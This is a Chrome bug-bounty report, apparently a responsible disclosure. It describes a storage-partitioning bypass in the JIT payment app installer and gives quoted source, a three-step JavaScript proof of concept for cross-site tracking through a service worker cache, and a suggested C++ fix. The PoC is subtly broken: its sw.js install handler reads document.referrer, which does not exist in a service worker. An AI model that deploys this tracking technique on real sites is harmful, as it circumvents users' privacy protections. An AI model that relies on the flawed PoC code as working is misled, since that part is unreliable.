# Chrome VRP Report: JIT Payment App Installer Bypasses Storage Partitioning in Third-Party Contexts

## Summary

The Just-In-Time (JIT) payment app installer in Chrome always creates a first-party `StorageKey` when registering service workers, even when the installation is triggered from a third-party (cross-origin iframe) context. This bypasses storage partitioning, allowing cross-site data leakage through payment handler service workers.

## Vulnerability Details

**Component:** `content/browser/payments/payment_app_installer.cc`

```cpp
// payment_app_installer.cc:105-112
// TODO(crbug.com/40177656): Because this function can be called in a 3p
// context we will need to generate a full StorageKey (origin + top-level
// site) once StorageKey is expanded with the top-level site.
service_worker_context_->RegisterServiceWorker(
    sw_url_,
    blink::StorageKey::CreateFirstParty(url::Origin::Create(option.scope)),
    option,
    ...);
```

The `CreateFirstParty()` call creates a `StorageKey` where the top-level site equals the origin, regardless of the actual embedding context. This is used in two places:
1. `FindReadyRegistrationForScope` (line 73-74) — looking up existing registrations
2. `RegisterServiceWorker` (line 105-112) — registering new service workers

## Steps to Reproduce

### Setup

1. **Payment handler site** (`https://pay.example.com`):
   - Serves a payment handler service worker
   - Has a valid payment method manifest

2. **Embedding site** (`https://tracker.example.com`):
   - Embeds `pay.example.com` in an iframe
   - The iframe initiates a PaymentRequest

### PoC — Cross-Site Storage Leak via JIT Payment App

**Step 1: Third-party JIT installation**
```html
<!-- On tracker.example.com -->
<iframe src="https://pay.example.com/checkout"></iframe>
```

```javascript
// Inside the iframe at pay.example.com (cross-origin context)
const request = new PaymentRequest(
  [{ supportedMethods: 'https://pay.example.com/pay' }],
  { total: { label: 'Total', amount: { currency: 'USD', value: '10.00' } } }
);
// JIT installation registers SW with first-party StorageKey
await request.show();
```

**Step 2: The service worker caches cross-site tracking data**
```javascript
// pay.example.com/sw.js
self.addEventListener('install', (e) => {
  // This data is stored with a first-party StorageKey
  // even though we're in a third-party context
  caches.open('tracking').then(cache => {
    cache.put('/id', new Response(JSON.stringify({
      installer: document.referrer, // tracker.example.com
      timestamp: Date.now()
    })));
  });
});
```

**Step 3: First-party visit reveals cross-site data**
```javascript
// User later visits pay.example.com directly
// The service worker from step 1 is found (same first-party StorageKey)
// Cross-site data from tracker.example.com is accessible
const cache = await caches.open('tracking');
const response = await cache.match('/id');
const data = await response.json();
// data.installer reveals the third-party embedding context
```

### Expected Behavior

The JIT-installed payment handler should use a partitioned `StorageKey` that includes the top-level site (`tracker.example.com`). This registration should NOT be visible when the user visits `pay.example.com` directly.

### Actual Behavior

The service worker is registered with `StorageKey::CreateFirstParty(pay.example.com)`, making it accessible across all contexts regardless of the embedding site.

## Impact

1. **Storage Partitioning Bypass**: JIT-installed payment handlers circumvent Chrome's storage partitioning, a core privacy feature
2. **Cross-Site Tracking**: Payment providers can correlate user activity across different sites by sharing data through the unpartitioned service worker
3. **Data Leakage**: First-party data from `pay.example.com` may be accessible when the handler is invoked from third-party contexts
4. **Registration Collision**: Third-party installations may overwrite or interfere with legitimate first-party service worker registrations

## Affected Versions

All Chrome versions with JIT payment app installation enabled (feature `kPaymentHandlerJustInTimeInstallation` is ENABLED_BY_DEFAULT).

## Severity Assessment

**Medium-High** — No compromised renderer required. This is a standard web-level attack that bypasses a core privacy feature (storage partitioning). The impact is similar to third-party cookie leaks, which Chrome has invested heavily in preventing.

## Suggested Fix

Replace `StorageKey::CreateFirstParty()` with a properly partitioned `StorageKey` that includes the top-level site from the embedding context:

```cpp
// Instead of:
blink::StorageKey::CreateFirstParty(url::Origin::Create(option.scope))

// Use:
blink::StorageKey(
    url::Origin::Create(option.scope),
    net::SchemefulSite(web_contents->GetPrimaryMainFrame()->GetLastCommittedOrigin()),
    blink::mojom::AncestorChainBit::kCrossSite)
```
